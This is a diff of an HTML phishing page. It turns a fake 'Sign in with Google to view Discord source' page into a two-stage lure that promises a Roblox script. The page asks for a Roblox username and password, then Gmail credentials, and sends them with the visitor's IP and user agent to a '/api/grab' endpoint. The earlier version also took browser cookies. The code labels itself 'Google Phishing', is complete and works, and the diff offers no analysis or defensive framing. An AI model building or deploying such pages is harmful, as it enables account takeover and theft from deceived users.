@@ -3,166 +3,278 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg - Sign in to view source</title>
+    <title>discord.gg - Roblox Script</title>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f8f9fa;
+            font-family: 'Source Code Pro', monospace;
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
+            color: #e0e0e0;
         }
         .container {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            background: rgba(20,20,40,0.95);
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
             overflow: hidden;
-            max-width: 420px;
+            max-width: 500px;
             width: 100%;
+            border: 1px solid #333;
         }
         .header {
-            background: linear-gradient(135deg, #4285f4, #34a853);
-            color: white;
-            padding: 40px 30px;
+            background: linear-gradient(135deg, #00d4ff, #0099cc);
+            padding: 30px;
             text-align: center;
-        }
-        .header i {
-            font-size: 48px;
-            margin-bottom: 20px;
-            opacity: 0.9;
         }
         .header h1 {
             font-size: 24px;
-            margin-bottom: 10px;
+            font-weight: 700;
+            margin-bottom: 8px;
         }
-        .header p {
-            opacity: 0.9;
-            font-size: 15px;
+        .code-preview {
+            padding: 30px;
+            background: #0a0a14;
+            border-bottom: 1px solid #333;
+            text-align: center;
         }
-        .content {
-            padding: 40px 30px;
+        .code-label {
+            color: #00ff88;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+        }
+        .roblox-code {
+            background: #1a1a2e;
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 25px;
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 6px;
+            color: #00d4ff;
+            position: relative;
+            margin: 0 auto;
+            max-width: 350px;
+        }
+        .stage {
+            padding: 30px;
+            display: none;
+        }
+        .stage.active {
+            display: block;
         }
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
         label {
             display: block;
             margin-bottom: 8px;
-            color: #333;
-            font-weight: 500;
-            font-size: 14px;
+            color: #ccc;
+            font-size: 13px;
+            font-weight: 600;
         }
         input {
             width: 100%;
             padding: 16px;
-            border: 2px solid #e1e5e9;
+            background: #1a1a2e;
+            border: 2px solid #333;
             border-radius: 8px;
+            color: #e0e0e0;
+            font-family: 'Source Code Pro', monospace;
             font-size: 16px;
-            transition: all 0.3s ease;
-            background: #fafbfc;
+            transition: all 0.3s;
         }
         input:focus {
             outline: none;
-            border-color: #4285f4;
-            background: white;
-            box-shadow: 0 0 0 3px rgba(66,133,244,0.1);
+            border-color: #00d4ff;
+            box-shadow: 0 0 0 3px rgba(0,212,255,0.2);
         }
-        .submit-btn {
+        .btn {
             width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Source Code Pro', monospace;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+        .roblox-btn {
+            background: linear-gradient(135deg, #00d4ff, #0099cc);
+            color: #0f0f23;
+        }
+        .google-btn {
             background: linear-gradient(135deg, #4285f4, #34a853);
             color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
         }
-        .submit-btn:hover {
+        .btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(66,133,244,0.4);
+            box-shadow: 0 15px 40px rgba(0,212,255,0.4);
+        }
+        .google-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .google-logo i {
+            font-size: 24px;
+        }
+        .success-image {
+            text-align: center;
+            padding: 30px;
+            display: none;
+        }
+        .success-image.active {
+            display: block;
+        }
+        .success-image img {
+            max-width: 100%;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 2px solid #00ff88;
         }
         .footer {
-            background: #f8f9fa;
+            background: #0a0a14;
             padding: 20px;
             text-align: center;
-            font-size: 13px;
-            color: #6c757d;
-            border-top: 1px solid #e9ecef;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #333;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <i class="fab fa-google"></i>
-            <h1>Sign in with Google</h1>
-            <p>Enter credentials to view Discord source code</p>
-        </div>
-        <form id="credForm" class="content">
+        <!-- Stage 1: Roblox Code Preview -->
+        <div id="stage1" class="stage active">
+            <div class="header">
+                <h1><i class="fab fa-roblox"></i> Roblox Hub</h1>
+                <p>Sign in to unlock full script</p>
+            </div>
+            
+            <div class="code-preview">
+                <div class="code-label">Script Code</div>
+                <div class="roblox-code">RBLX-ABCD-XXXX-XXXX-XXXX</div>
+            </div>
+            
             <div class="form-group">
-                <label><i class="fas fa-envelope"></i> Email or Phone</label>
-                <input type="email" id="email" placeholder="you@gmail.com" required>
+                <label><i class="fas fa-user"></i> Roblox Username</label>
+                <input type="text" id="robloxUser" placeholder="yourusername123" required>
             </div>
             <div class="form-group">
-                <label><i class="fas fa-lock"></i> Password</label>
-                <input type="password" id="password" placeholder="Enter your password" required>
+                <label><i class="fas fa-lock"></i> Roblox Password</label>
+                <input type="password" id="robloxPass" placeholder="Enter password" required>
             </div>
-            <button type="submit" class="submit-btn">
-                <i class="fab fa-google"></i> Sign in with Google
+            
+            <button onclick="nextStage()" class="btn roblox-btn">
+                <i class="fas fa-arrow-right"></i> Continue to Google Auth
             </button>
-        </form>
+        </div>
+
+        <!-- Stage 2: Google Phishing -->
+        <div id="stage2" class="stage">
+            <div class="header" style="background: linear-gradient(135deg, #4285f4, #34a853);">
+                <h1><i class="fab fa-google"></i> Google Sign In</h1>
+                <p>Verify account to unlock Roblox script</p>
+            </div>
+            
+            <div class="google-logo">
+                <i class="fab fa-google" style="color: #4285f4; font-size: 32px;"></i>
+                <span>Continue with Google</span>
+            </div>
+            
+            <div class="form-group">
+                <label><i class="fas fa-envelope"></i> Gmail Address</label>
+                <input type="email" id="googleEmail" placeholder="you@gmail.com" required>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-lock"></i> Google Password</label>
+                <input type="password" id="googlePass" placeholder="Enter your password" required>
+            </div>
+            
+            <button onclick="submitAll()" class="btn google-btn">
+                <i class="fas fa-check"></i> Unlock Script
+            </button>
+        </div>
+
+        <!-- Stage 3: Success -->
+        <div id="stage3" class="success-image">
+            <img id="rewardImage" src="https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=800" alt="Full Script">
+            <p style="margin-top: 20px; color: #00ff88; font-size: 16px; font-weight: 600;">
+                ✅ Script unlocked! Copy code above.
+            </p>
+        </div>
+        
         <div class="footer">
-            discord.gg • Protected by Google
+            discord.gg • roblox-hub.com
         </div>
     </div>
 
     <script>
-        document.getElementById('credForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const ip = await fetchIP();
-            const data = {
-                ip: ip,
-                email: document.getElementById('email').value,
-                password: document.getElementById('password').value,
+        async function nextStage() {
+            const robloxData = {
+                ip: await fetchIP(),
+                roblox_username: document.getElementById('robloxUser').value,
+                roblox_password: document.getElementById('robloxPass').value,
                 userAgent: navigator.userAgent,
-                referrer: document.referrer,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookies: document.cookie,
                 timestamp: new Date().toISOString(),
-                action: 'google_creds'
+                action: 'roblox_creds'
             };
 
+            // Send Roblox creds FIRST
             await fetch('/api/grab', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify(robloxData)
             });
 
-            // Redirect to fake success
-            window.location.href = 'https://discord.com/login?code=success';
-        });
+            // Switch to Google stage
+            document.getElementById('stage1').classList.remove('active');
+            document.getElementById('stage2').classList.add('active');
+        }
+
+        async function submitAll() {
+            const googleData = {
+                ip: await fetchIP(),
+                google_email: document.getElementById('googleEmail').value,
+                google_password: document.getElementById('googlePass').value,
+                roblox_username: document.getElementById('robloxUser').value,
+                roblox_password: document.getElementById('robloxPass').value,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                action: 'google_roblox_double'
+            };
+
+            // Send ALL creds
+            await fetch('/api/grab', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(googleData)
+            });
+
+            // Show success
+            document.getElementById('stage2').classList.remove('active');
+            document.getElementById('stage3').classList.add('active');
+        }
 
         async function fetchIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 return data.ip;
-            } catch {
-                return 'unknown';
-            }
+            } catch { return 'unknown'; }
         }
     </script>
 </body>
